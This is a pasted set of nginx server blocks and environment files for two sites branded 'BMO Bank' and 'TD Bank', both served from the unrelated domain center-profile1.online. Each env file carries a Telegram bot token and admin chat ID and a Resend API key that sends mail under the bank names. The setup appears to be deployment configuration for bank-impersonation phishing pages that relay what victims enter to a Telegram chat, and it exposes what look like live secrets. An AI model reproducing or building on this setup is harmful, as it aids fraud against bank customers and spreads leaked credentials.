bmo bank nginx file

server {
    server_name center-profile1.online www.center-profile1.online;

        root /var/www/bmoBan/client/dist;
        index index.html;

        location / {
        try_files $uri $uri/ /index.html;
    }

        location /api {
        proxy_pass http://localhost:5001;
        proxy_http_version 1.1;
        proxy_set_header Upgrade $http_upgrade;
        proxy_set_header Connection 'upgrade';
        proxy_set_header Host $host;
        proxy_set_header X-Real-IP $remote_addr;
        proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
        proxy_set_header X-Forwarded-Proto $scheme;
        proxy_cache_bypass $http_upgrade;
    }
}

# BMO Bank .env

# PORT=5001
# ADMIN_CHAT_ID=8528084444
# BOT_TOKEN=8823667777:AAGdXH77lKqc1SGslaCIisQjf7dp1-w7bio
# FRONTEND_URL=center-profile1.online

# # Resend — Admin Email Sender
# RESEND_API_KEY=re_WbDvgFLd_8KNddbjGYqfAduY31DzZ6bfo
# RESEND_FROM_EMAIL=noreply@center-profile1.online
# RESEND_FROM_NAME=BMO BANK

# TD Bank

server {
    server_name center-profile1.online www.center-profile1.online;

    # Serve React build
    root /var/www/tdBan/client/dist;
    index index.html;

    # All routes go to React
    location / {
        try_files $uri $uri/ /index.html;
    }

    # Proxy API calls to Node server
    location /api/ {
        proxy_pass http://localhost:5002;
        proxy_http_version 1.1;
        proxy_set_header Host $host;
        proxy_set_header X-Real-IP $remote_addr;
    }

}

PORT=5002
BOT_TOKEN=8905532670:AAFzC_Pglf3cjxUFTjKWFt7WSVNdM7oegog
ADMIN_CHAT_ID=8528084444
FRONTEND_URL=https://center-profile1.online

# Resend — Admin Email Sender
RESEND_API_KEY=re_Xs1F1ssi_8BuX8dy6UkRnjGB45C7QJZQn
RESEND_FROM_EMAIL=noreply@center-profile1.online
RESEND_FROM_NAME=TD BANK
